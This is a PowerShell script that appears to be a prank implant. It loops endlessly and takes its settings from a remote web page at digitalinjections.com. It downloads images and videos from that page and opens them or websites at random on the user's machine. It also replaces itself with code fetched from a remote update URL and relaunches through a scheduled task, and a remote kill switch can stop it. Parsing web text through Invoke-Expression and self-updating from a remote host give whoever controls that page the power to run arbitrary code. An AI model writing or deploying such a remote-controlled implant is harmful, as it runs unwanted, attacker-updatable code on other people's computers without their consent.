Do{
    #Start Loop
    #TestNo 16
    
    ##LoopClear
    Remove-Variable CanDownload -Force -ErrorAction SilentlyContinue
    Remove-Variable CanUpdate -Force -ErrorAction SilentlyContinue
    Remove-Variable CanShowPhoto -Force -ErrorAction SilentlyContinue
    Remove-Variable CanShowVideo -Force -ErrorAction SilentlyContinue
    Remove-Variable CanShowWeb -Force -ErrorAction SilentlyContinue
    Remove-Variable Links -Force -ErrorAction SilentlyContinue
    Remove-Variable Link -Force -ErrorAction SilentlyContinue
    Remove-Variable FileTypesO -Force -ErrorAction SilentlyContinue
    Remove-Variable PhotoLinks -Force -ErrorAction SilentlyContinue
    Remove-Variable VideoLinks -Force -ErrorAction SilentlyContinue
    Remove-Variable WebLinks -Force -ErrorAction SilentlyContinue
    Remove-Variable RandPool -Force -ErrorAction SilentlyContinue
    Remove-Variable UpdatePath -Force -ErrorAction SilentlyContinue
    Remove-Variable MediaPathO -Force -ErrorAction SilentlyContinue
    Remove-Variable Sleep -Force -ErrorAction SilentlyContinue
    Remove-Variable Kill -Force -ErrorAction SilentlyContinue
    Remove-Variable NewVersion -Force -ErrorAction SilentlyContinue
    Remove-Variable CurrentVersion -Force -ErrorAction SilentlyContinue
	Remove-Variable Debug -Force -ErrorAction SilentlyContinue
    
    $CurrentVersion = "1.16"
    $Continue = $True
    $MediaPath = "C:\Users\aldur\Pictures\Thumbs"
    
    ##WEBREQUEST
    $Web = Invoke-webrequest http://digitalinjections.com/stinatroll/
    $Variables = ($Web.ParsedHtml.body.getElementsByClassName('entry-content'))[0].innertext -split "`r`n"
    
    ##PROCESS WEB
    Foreach ($Var in $Variables){
        $Name = $Var.split('=',2)[0]
        $Data = $Var.split('=',2)[1]
        
        if(($Data -match " ") -and ($Name -notmatch "Path")){
            $Array = $Data -split ' +(?=(?:[^\"]*\"[^\"]*\")*[^\"]*$)'
            New-Variable -Name $Name -Value $Array
        } elseif($Data -match 'True') {
            Invoke-Expression ("`$$($Name) = `$True")
        } elseif($Data -match 'False') {
            Invoke-Expression ("`$$($Name) = `$False")
        } else {
            New-Variable -Name $Name -Value $Data
        } 
    }
    
    ##CHECK FOR OVERRIDES
    if($Kill){exit}
    if($MediaPathO){$MediaPath = $MediaPathO}
    if($FileTypesO){$FileTypes = $FileTypesO}
    
    ##DEFAULTS
    $WC = New-Object System.Net.WebClient
    
    $PhotoFolder = "$MediaRoot\Photos"
    $VideoFolder = "$MediaRoot\Video"
    
    ##PROCESS DOWNLOADS
    if($CanDownload){
		if($Debug){Write-Host "Script can doanload..."}
        New-Item -ItemType Directory -Force -Path "$PhotoFolder" | Out-Null
        New-Item -ItemType Directory -Force -Path "$VideoFolder" | Out-Null
        foreach ($Link in $PhotoLinks){
			if($Debug){Write-Host "Downloading link..."}
            $SystemName = Split-Path $Link -Leaf
            $Path = "$PhotoFolder\$SystemName"
            if(!(Get-ChildItem -Path $Path -ErrorAction SilentlyContinue)){
                $WC.DownloadFile($Link,$Path)
            }
        }
    
        foreach($Link in $VideoLinks){
			if($Debug){Write-Host "Downloading video..."}
            $SystemName = Split-Path $Link -Leaf
            $Path = "$VideoFolder\$SystemName"
            if(!(Get-ChildItem -Path $Path -ErrorAction SilentlyContinue)){
                $WC.DownloadFile($Link,$Path)
            }
        }
    }
    
    ##PROCESS Doables
    $DoOn = 1,3,5,7,9
    $DoingIndex = Get-Random -Minimum 1 -Maximum $RandPool
    if($DoOn -contains $DoingIndex){
		if($Debug){Write-Host "Random event triggered..."}
        $Index = Get-Random -Maximum 3
    
        switch($Index){
            0 {
                if($CanShowPhoto){
                    $Pictures = Get-ChildItem -Path $PhotoFolder | ?{$FileTypes -match $_.Extension}
                    $Rand = Get-Random -Minimum 0 -Maximum ($Pictures.Count - 1)
                    $Picture = $Pictures[$Rand].FullName
                    & "$Picture"
                }
              }
            1 {
                if($CanShowVideo){
                    $Videos = Get-ChildItem -Path $VideoFolder | ?{$FileTypes -match $_.Extension}
                    $Rand = Get-Random -Minimum 0 -Maximum $Videos.Count
                    $Video = $Videos[$Rand].FullName
                    & "$Video"
                }
              }
            2 {
                if($CanShowWeb){
                    $Rand = Get-Random -Minimum 0 -Maximum $WebLinks.Count
                    $Website = $WebLinks[$Rand]
                    Start-Process -FilePath $Website  
                }
              }
        }
    } else {
		if($Debug){Write-Host "Event skipped..."}
    }
    
    ##PROCESS UPDATE
    If($CanUpdate){
		if($Debug){Write-Host "Site indicated update available..."}
        $Script = $MyInvocation.InvocationName
        $Name = Split-Path $Script -Leaf
        $TempFile = "$env:TEMP\$Name"
        Remove-Item $TempFile -Force
        $WC.DownloadFile($UpdatePath,$TempFile)
        if($CurrentVersion -notmatch $NewVersion){
			if($Debug){
				Write-Host "Version mismatch, downloading new version..."
				Write-Host "Current Version: $CurrentVersion || New Version $NewVersion || Temp File: $TempFile || Update Path: $UpdatePath || Script: $Script"
				Write-Host "Copying..."
				Pause
			}
            Copy-Item -Path $TempFile -Destination $Script -Force
            Remove-Item $TempFile -Force
            Start-ScheduledTask -TaskName Task
            exit
        }
        
    }
    
    ##WAIT
    Sleep -Seconds $Sleep
    
    ##SAFETY KILL
    if($Kill){$Continue = $false}
} while($Continue)
